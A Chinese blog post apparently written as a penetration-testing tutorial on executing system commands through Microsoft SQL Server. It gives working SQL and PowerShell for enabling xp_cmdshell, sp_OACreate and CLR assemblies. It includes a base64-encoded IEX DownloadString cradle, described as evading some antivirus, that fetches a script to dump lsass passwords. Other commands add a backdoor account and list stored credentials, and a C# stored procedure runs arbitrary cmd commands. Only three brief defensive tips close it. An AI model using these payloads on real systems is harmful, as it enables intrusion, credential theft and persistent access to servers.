---
title: 探索基于MSSQL利用实现命令执行
date: 2019-10-19 11:51:24
description: 极客兔兔的小站，致力于分享一些技术教程和有趣的技术实践。



---

# 0x01 前言

 在渗透测试过程中，经常会碰到MSSQL数据库，通常我们会使用数据库中的扩展存储过程，例如xp_cmdshell 来进行提权或执行系统命令之类的操作,但是当xp_cmdshell不能使用的时候，我们还有什么别的方式呢？本文将介绍与分享笔者总结的一些姿势以及对应的防护措施。

本文将要介绍以下内容：

- 快速灵活探测内网中存活mssql实例方法
- 基于xp_cmdshell 命令执行的常用方法
- 基于sp_OACreate 命令执行的多种方式
- 通过加载CLR 自定义函数功能执行命令

# 0x02 探测MSSQL服务

 为了能快速寻找目标内网中所有存活的mssql实例作为切入点，如果进行大量扫描，极可能被网络流量防御设备监控，无疑是暴露自己的行踪，以下列举了常用的两种基于Windows原生工具快速探测MSSQL服务的方法。

基于工作组下mssql实例发现：

 System.Data.SqlClient 命名空间是用于 SQL Server 的 .NET 数据提供程序。在net framework2.0 中新增加SqlDataSourceEnumerator类。提供了一种枚举本地网络内的所有可用 SQL Server 实例机制。

```
PowerShell -Command "[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()"
```

![img](https://www.yunzhijia.com/microblog/filesvr/5dab2c27a372595c61631fcd)

基于域环境下mssql实例发现：

通过SPN进行查询:

 SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN，对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分,因此查询SPN的操作难以被检测到，使用windows下自带工具进行查询

```
setspn -T domain.com -Q */* | findstr "MSSQL"
```

![img](https://www.yunzhijia.com/microblog/filesvr/5dab2c48a372595c61631fd7)

# 0x03 关于MSSQL实质利用

**启用目标mssql的xp_cmdshell**

 xp即eXtended Procedure，MSSQL中以XP打头的系统SP都是扩展存储过程，例如：xp_dirtree、XP_REGREAD，xp_subdirs等，xp_cmdshell 可以传递命令给cmd去执行。为了安全，这个功能在MSSQL中默认是未开放的。

 查询当前sa是否为sysadmin系统管理员角色，默认情况下，只有sysadmin和serveradmin权限才有运行RECONFIGURE 语句的权限，实则开启该存储过程

 从 2008r2 之后的 mssql 版本,如果是全程默认安装，已不再是system或者administrator,而是一个很低的 network 权限。

```
SELECT is_srvrolemember('sysadmin');
exec sp_configure 'show advanced options', 1;reconfigure;
exec sp_configure 'xp_cmdshell',1;reconfigure;
```

实例：

尝试远程加载ps脚本提取主机lsass内存进程中的明文密码

使用System.Text.Encoding类将命令转换成Unicode字节数组,并进行utf_16_le编码，回到目标主机解码运行，实测部分杀软暂时不拦

```
$text = "IEX (New-Object Net.WebClient).DownloadString('https://192.168.1.232/mq.ps1'); Invoke-mq"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
echo $EncodedText
```

![img](https://www.yunzhijia.com/microblog/filesvr/5dab2cb990144e463b1c72f1)

**启用目标** **mssql** **的** **sp_oacreate**

 如果系统中xp_cmdshell组件对应的dll文件被删除或反病毒软件监控,返回`CreateProcess Error Code 5`等问题，依然可以继续使用sp_oacreate存储过程进行命令交互。

sp_oacreate简介

```
参考语法:
sp_OACreate { progid | clsid } , objecttoken OUTPUT [ , context ]
```

progid是要创建的OLE对象的编程标识符（ProgID）。此字符串描述OLE对象的类，其格式为：’ OLEComponent,它是OLE自动化服务器的组件名称,clsid为对象的类标识符 (CLSID)。

此字符串描述该 OLE 对象的类，其形式如下：’{nnnnnnnn-nnnn-nnnn-nnnn-nnnnnnnnnnnn}’

Object是OLE对象的名称,指定的 OLE 对象必须有效并且必须支持 IDispatch 接口。

OUTPUT是返回的对象标记，必须是数据类型为int的局部变量。此对象标记标识创建的OLE对象，并用于调用其他OLE自动化存储过程。

使用sysadmin权限,启用OLE Automation Procedures配置:

```
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'Ole Automation Procedures', 1;RECONFIGURE;
```

![img](https://www.yunzhijia.com/microblog/filesvr/5dab2d04b54c8d6b11b3b9c1)

实例:

```
declare @shell int
exec sp_oacreate 'wscript.shell', @shell output
exec sp_oamethod @shell, 'run' , null, 'c:\windows\system32\cmd.exe \c "net user c1y2m3 pinohd123. /add" '
```

其中sp_OACreate 创建 OLE 对象 wscript.shell,这个对象也可以是其他ole对象,而 sp_OAMethod 调用 OLE 对象的方法, 如果未使用特定参数，则需要将NULL值作为占位符传递。

![img](https://www.yunzhijia.com/microblog/filesvr/5dab2d4790144e463b1c731f)

通过调用`sp_oacreate`能够获得一个数字返回值0（成功）或非零数字（失败），它是OLE自动化对象返回值。

同时这种方式是无法回显的,当然,我们也可以使用DNS、HTTP等传输协议进行获取对应命令输出，但这并不是这此次的目的，既然能通过利用sp_OACreate系统存储过程来操作COM对象，以下我列举了OLE实例常用的对象：

```
1、Scripting.FileSystemObject—>提供一整套文件系统操作函数

2、Scripting.Dictionary—>用来返回存放键值对的字典对象

3、Wscript.Shell—>提供一套读取系统信息的函数，如读写注册表、查找指定文件的路径、读取DOS环境变量，读取链接中的设置

4、Wscript.NetWork—>提供网络连接和远程打印机管理的函数。（其中，所有Scripting对象都存放在SCRRUN.DLL文件中，所有的Wscript对象都存放在WSHOM.ocx文件中。）
```

经过探索,下面分享三种方法笔者实现执行命令并获取回显的方法。

## 一、scripting.filesystemobject

1、首先将结果重定向输出到文件

```
declare @shell int 
exec sp_oacreate 'wscript.shell',@shell output 
exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c ipconfig > C:\xampp\whoami.txt'
```

2、创建一个scripting.filesystemobject对象实例，获取对象中opentextfile方法

![img](https://www.yunzhijia.com/microblog/filesvr/5dab2d79b54c8d6b11b3b9e2)

语法：

```
OpenTextFile(BSTR FileName, IOMode IOMode, VARIANT_BOOL Create, Tristate Format);
```

3、使用sp_oamethod 调用实例方法并循环输出命令执行结果：

```
declare @c int, @y int, @ret int
declare @line varchar(8000)
exec sp_oacreate 'scripting.filesystemobject', @c out 
exec sp_oamethod @c, 'opentextfile', @y out, 'C:\xampp\whoami.txt', 1 
exec @ret = sp_oamethod @y, 'readline', @line out
while( @ret = 0 )
begin
print @line
exec @ret = sp_oamethod @y, 'readline', @line out
END
```

![img](https://www.yunzhijia.com/microblog/filesvr/5dab2da732f2ca14fb88e85c)

同时通过创建数据库表,插入绝对路径文件到字段也是可以实现获取命令输出结果,显然这种方法不是最佳的选择,完整命令如下：

```
use tempdb;
create table aaaa(a text);
BULK INSERT aaaa
FROM 'C:\xampp\whoami.txt'
WITH (
FIELDTERMINATOR = 'n',
ROWTERMINATOR = 'nn')
select * from aaaa
```

![img](https://www.yunzhijia.com/microblog/filesvr/5dab2dc728011f6d69bc356f)

## 二、wscript.shell.exec

以上二种方法原理都需将文件落地到目标服务器上进行读取，

是否能尝试无文件落地直接获取命令输出呢？

通过查阅相关网上资料，发现大多都是通过wscript.shell run执行系统程序，

于是，我尝试跟进wscript.shell对象，枚举出可以调用的方法如下：

![img](https://www.yunzhijia.com/microblog/filesvr/5dab2e3732f2ca14fb88e892)

```
CreateShortcut 
Run 
Popup 
RegDelete 
RegRead 
RegWrite 
SendKeys
Exec
.....
```

其中run的返回值是一个整数，而exec方法的返回值是一个对象，从返回对象中可以取到控制台错误和控制台信息，即stdout和stderr属性。

![img](https://www.yunzhijia.com/microblog/filesvr/5dab2eab28011f6d69bc35b4)

故成功通过调用wscript.shell实例exec中stdout实现无文件落地回显命令：

```
declare @shell int,@exec int,@text int,@str varchar(8000);
exec sp_oacreate 'wscript.shell',@shell output 

exec sp_oamethod @shell,'exec',@exec output,'cmd.exe /c cmdkey /list'
exec sp_oamethod @exec, 'StdOut', @text out;
exec sp_oamethod @text, 'ReadAll', @str out
select @str
```

![img](https://www.yunzhijia.com/microblog/filesvr/5dab2ee06d67ff07ef514114)

到此，成功通过sp_oacreate 回显执行命令,与xp_cmdeshell无差。

## 启用mssql的CLR功能

 SQL CLR 实现了对 .NET Framework 的公共语言运行时(CLR)的集成 ，它能将外部的函数导入到 SQL Server 存储过程中，让 SQL Server 的部分数据库对象可以调用用户自定义函数，等同于Mysql数据库中的UDF。

SQL Server执行CLR,需要满足以下条件：

1、在MSSQL Server 上允许启用CLR 并创建自定义存储过程

2、拥有CREATE ASSEMBLY、EXEC，CREATE PROCEDURE 权限

附上测试代码：

```
using System;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using Microsoft.SqlServer.Server;
using System.IO;
using System.Diagnostics;
using System.Text;

public partial class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void cmd_exec (SqlString execCommand)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand.Value);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();

        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
        SqlContext.Pipe.SendResultsStart(record);
        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
        SqlContext.Pipe.SendResultsRow(record);
        SqlContext.Pipe.SendResultsEnd();
        proc.WaitForExit();
        proc.Close();
    }
};
```

关键代码在cmd_exec内，代码逻辑很简单，通过调用cmd进程，并将execCommand参数进行传递执行，并应用out属性返回输出参数。

调用 NET Framework目录下的csc.exe将代码编译成dll文件，csc.exe 是 .NET 提供在命令行下编译 cs 文件的工具，安装了.Net 环境的主机的默认位置在 C:\Windows\Microsoft.NET\Framework[.NET 具体版本号] 目录下

由于笔者这里用的是2008 R2版本的数据库，故使用低版本.net 3.5编译 ,并将生成后的文件内容转换成十六进制字符串进行存储

![img](https://www.yunzhijia.com/microblog/filesvr/5dab2f28a372595c616320a8)

启用当前数据库CLR功能

```
Sp_Configure 'clr enabled', 1
RECONFIGURE
```

将程序集加载到内存中

```
CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM 
0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300C8D0A65D0000000000000000E00002210B0108000008000000060000000000004E270000002000000040000000004000002000000002.....
```

修改允许程序集不受限制访问SQL Server 内部和外部资源，

```
WITH PERMISSION_SET = UNSAFE
```

从加载的程序集创建存储过程

```
CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];
```

执行输出系统命令

```
EXEC[dbo].[cmd_exec] 'whoami'
```

## 0x04 防御措施

1、用户权限分配时，剥夺CREATE ASSEMBLY, CREATE PROCEDURE, EXEC权限。

2、对MSSQL Server 启动服务权限进行分配，限制高权限用户启动

3、加强数据库账号口令策略，避免存在弱口令。